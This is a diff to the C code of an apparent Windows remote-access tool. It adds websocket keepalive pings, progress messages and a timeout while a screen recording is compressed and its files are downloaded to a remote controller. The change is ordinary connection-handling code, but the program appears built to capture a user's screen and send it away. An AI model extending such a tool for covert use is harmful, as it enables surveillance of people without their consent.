@@ -3571,7 +3571,22 @@ void download_screenrecord() {
         send_websocket_data("[*] Stopping recording and compressing...\n", 42);
         g_screenrecord_running = 0;
         if (g_screenrecord_thread) {
-            WaitForSingleObject(g_screenrecord_thread, 300000);
+            // Wait for recording thread with periodic pings to keep connection alive
+            DWORD wait_result;
+            int wait_count = 0;
+            while ((wait_result = WaitForSingleObject(g_screenrecord_thread, 3000)) == WAIT_TIMEOUT) {
+                send_websocket_ping();
+                wait_count++;
+                if (wait_count % 10 == 0) {
+                    send_websocket_data("[*] Still compressing video...\n", 31);
+                }
+                // Timeout after 5 minutes
+                if (wait_count > 100) {
+                    send_websocket_data("[!] Compression timed out\n", 26);
+                    TerminateThread(g_screenrecord_thread, 0);
+                    break;
+                }
+            }
             CloseHandle(g_screenrecord_thread);
             g_screenrecord_thread = NULL;
         }
@@ -3660,8 +3675,14 @@ void download_screenrecord() {
             send_websocket_data(msg, strlen(msg));
         }
         
+        // Send ping before each file to ensure connection is alive
+        send_websocket_ping();
+        Sleep(100);
+        
         if (download_file(files[i])) {
             success_count++;
+            // Ping after successful download
+            send_websocket_ping();
         } else {
             fail_count++;
             char* filename = strrchr(files[i], '\\');
